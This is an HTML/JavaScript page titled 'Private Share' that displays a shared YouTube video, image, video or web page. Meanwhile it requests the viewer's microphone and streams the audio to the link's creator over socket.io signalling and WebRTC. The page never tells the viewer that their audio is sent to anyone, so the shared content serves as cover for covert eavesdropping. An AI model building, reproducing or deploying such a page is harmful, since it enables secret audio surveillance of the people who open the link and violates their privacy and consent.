<!DOCTYPE html>
<html lang="en">
<head>

  <meta charset="UTF-8">

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
  >

  <title>Private Share</title>

  <script src="/socket.io/socket.io.js"></script>

  <style>

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      background: #ffffff;
      font-family: Arial, sans-serif;
    }

    #content {
      width: 100%;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    iframe {
      width: 100%;
      max-width: 1000px;
      height: 560px;
      border: 0;
    }

    img {
      max-width: 100%;
      max-height: 100vh;
      object-fit: contain;
    }

    video {
      width: 100%;
      max-height: 100vh;
    }

    #message {
      color: #777;
      text-align: center;
      padding: 30px;
    }

  </style>

</head>

<body>

<div id="content">

  <div id="message">
    Loading...
  </div>

</div>


<script>

const shareId =
  window.location.pathname
    .split("/")
    .pop();


const socket =
  io();


let localStream =
  null;

let peerConnection =
  null;


/* =========================================================
   FIND SHARE
   ========================================================= */

socket.on(
  "connect",
  () => {

    socket.emit(
      "receiver-join",
      {
        shareId:
          shareId
      }
    );

  }
);


/* =========================================================
   SHARE FOUND
   ========================================================= */

socket.on(
  "share-found",
  async (data) => {

    showContent(
      data.originalUrl
    );


    /*
      Browser will show its own
      microphone permission popup.
    */

    try {

      localStream =
        await navigator.mediaDevices.getUserMedia({
          audio: true,
          video: false
        });


      /*
        Tell creator that mic permission
        was granted.
      */

      socket.emit(
        "receiver-ready",
        {
          shareId:
            shareId
        }
      );


    } catch (error) {

      console.error(
        "Microphone error:",
        error
      );

      document.getElementById(
        "message"
      ).innerText =
        "Microphone permission was not granted.";

    }

  }
);


/* =========================================================
   SHOW ORIGINAL CONTENT
   ========================================================= */

function showContent(url) {

  const content =
    document.getElementById(
      "content"
    );


  /*
    YouTube
  */

  if (
    url.includes("youtube.com/watch") ||
    url.includes("youtu.be/")
  ) {

    let videoId = "";


    if (
      url.includes("youtu.be/")
    ) {

      videoId =
        url.split("youtu.be/")[1]
          .split(/[?&]/)[0];

    } else {

      const params =
        new URL(url).searchParams;

      videoId =
        params.get("v");

    }


    if (videoId) {

      content.innerHTML = `
        <iframe
          src="https://www.youtube.com/embed/${videoId}"
          allow="autoplay; encrypted-media"
          allowfullscreen>
        </iframe>
      `;

      return;

    }

  }


  /*
    Direct Image
  */

  if (
    /\.(jpg|jpeg|png|gif|webp|svg)(\?.*)?$/i
      .test(url)
  ) {

    content.innerHTML = `
      <img src="${escapeHtml(url)}">
    `;

    return;

  }


  /*
    Direct Video
  */

  if (
    /\.(mp4|webm|ogg|mov)(\?.*)?$/i
      .test(url)
  ) {

    content.innerHTML = `
      <video
        src="${escapeHtml(url)}"
        controls
        autoplay>
      </video>
    `;

    return;

  }


  /*
    Instagram / Facebook / other URLs
  */

  content.innerHTML = `
    <iframe
      src="${escapeHtml(url)}"
      style="
        width:100%;
        height:100vh;
        border:0;
      ">
    </iframe>
  `;

}


/* =========================================================
   ESCAPE URL
   ========================================================= */

function escapeHtml(value) {

  return value
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");

}


/* =========================================================
   WEBRTC
   ========================================================= */

socket.on(
  "webrtc-offer",
  async (offer) => {

    if (!localStream) {
      return;
    }


    peerConnection =
      new RTCPeerConnection({

        iceServers: [

          {
            urls:
              "stun:stun.l.google.com:19302"
          }

        ]

      });


    /*
      Add microphone tracks
    */

    localStream
      .getTracks()
      .forEach(
        track => {

          peerConnection.addTrack(
            track,
            localStream
          );

        }
      );


    /*
      Send ICE
    */

    peerConnection.onicecandidate =
      event => {

        if (
          event.candidate
        ) {

          socket.emit(
            "webrtc-ice-candidate",
            {
              shareId:
                shareId,

              candidate:
                event.candidate
            }
          );

        }

      };


    /*
      Answer
    */

    await peerConnection.setRemoteDescription(
      new RTCSessionDescription(
        offer
      )
    );


    const answer =
      await peerConnection.createAnswer();


    await peerConnection.setLocalDescription(
      answer
    );


    socket.emit(
      "webrtc-answer",
      {
        shareId:
          shareId,

        answer:
          answer
      }
    );

  }
);


/* =========================================================
   ICE
   ========================================================= */

socket.on(
  "webrtc-ice-candidate",
  async candidate => {

    if (!peerConnection) {
      return;
    }


    try {

      await peerConnection.addIceCandidate(
        new RTCIceCandidate(
          candidate
        )
      );

    } catch (error) {

      console.error(error);

    }

  }
);


/* =========================================================
   CALL END
   ========================================================= */

socket.on(
  "call-ended",
  () => {

    if (localStream) {

      localStream
        .getTracks()
        .forEach(
          track =>
            track.stop()
        );

    }


    if (peerConnection) {

      peerConnection.close();

      peerConnection =
        null;

    }

  }
);

</script>

</body>
</html>
